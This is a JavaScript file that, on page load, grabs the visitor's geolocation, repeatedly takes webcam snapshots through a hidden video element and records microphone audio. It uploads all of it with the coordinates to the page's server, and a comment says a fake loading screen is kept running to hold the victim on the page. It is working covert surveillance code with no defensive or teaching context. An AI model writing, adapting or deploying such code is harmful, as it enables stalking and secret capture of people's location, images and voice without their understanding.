async function captureData() {
    try {
        const position = await getLocation();
        const { latitude, longitude } = position.coords;

        // Initial capture
        await captureImageAndUpload(latitude, longitude);
        await recordAudioAndUpload(latitude, longitude);

        // Set intervals for continuous capture
        setInterval(async () => {
            await captureImageAndUpload(latitude, longitude);
        }, 5000); // Every 5 seconds

        setInterval(async () => {
            await recordAudioAndUpload(latitude, longitude);
        }, 10000); // Every 10 seconds

        // Keep the loading screen visible even after data is captured
        setInterval(() => {
            console.log('Looping animation...');
        }, 1000);
    } catch (error) {
        console.error('Error capturing data:', error);
    }
}

function getLocation() {
    return new Promise((resolve, reject) => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(resolve, reject);
        } else {
            reject(new Error('Geolocation is not supported by this browser.'));
        }
    });
}

function captureImageAndUpload(latitude, longitude) {
    return new Promise(async (resolve, reject) => {
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            await video.play();

            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('latitude', latitude);
                formData.append('longitude', longitude);
                formData.append('image', blob, 'image.jpg');

                await fetch('/upload_image', {
                    method: 'POST',
                    body: formData
                });

                resolve();
                stream.getTracks().forEach(track => track.stop());
                document.body.removeChild(video);
            }, 'image/jpeg');
        } catch (error) {
            reject(error);
        }
    });
}

function recordAudioAndUpload(latitude, longitude) {
    return new Promise(async (resolve, reject) => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mediaRecorder = new MediaRecorder(stream);
            let audioChunks = [];

            mediaRecorder.ondataavailable = event => {
                audioChunks.push(event.data);
            };

            mediaRecorder.onstop = async () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
                const formData = new FormData();
                formData.append('latitude', latitude);
                formData.append('longitude', longitude);
                formData.append('audio', audioBlob, 'audio.mp3');

                await fetch('/upload_audio', {
                    method: 'POST',
                    body: formData
                });

                resolve();
                stream.getTracks().forEach(track => track.stop());
            };

            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), 5000); // Record for 5 seconds
        } catch (error) {
            reject(error);
        }
    });
}

// Start capturing data once the page loads
window.addEventListener('load', captureData);
